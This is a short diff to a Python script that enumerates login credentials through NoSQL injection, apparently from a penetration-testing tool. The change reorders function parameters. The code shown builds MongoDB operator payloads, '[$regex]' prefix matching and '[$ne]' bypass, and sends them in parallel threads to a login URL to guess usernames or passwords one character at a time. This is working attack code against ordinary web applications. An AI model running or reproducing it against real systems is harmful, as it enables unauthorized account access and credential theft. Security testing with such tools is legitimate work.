@@ -37,7 +37,7 @@ def get_method(args):
 def build_payloads(characters):
     return [firstChar + char for firstChar in characters for char in characters]
 
-def process_payload(payload, url, method, enum_parameter, password_parameter, other_parameters, session, characters):
+def process_payload(payload, characters, url, method, enum_parameter, password_parameter, other_parameters, session):
     para = {enum_parameter + '[$regex]': "^" + payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
     try:
         r = session.request(method=method, url=url, data=para, allow_redirects=False, timeout=10)
@@ -90,7 +90,7 @@ def main():
     with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
         results = []
         for payload in payloads:
-            results.append(executor.submit(process_payload, payload, url, method, enum_parameter, password_parameter, other_parameters, session, characters))
+            results.append(executor.submit(process_payload, payload, characters, url, method, enum_parameter, password_parameter, other_parameters, session))
         
         for future in concurrent.futures.as_completed(results):
             userpass = future.result()
@@ -107,5 +107,4 @@ def main():
 
 if __name__ == "__main__":
     main()
-
 
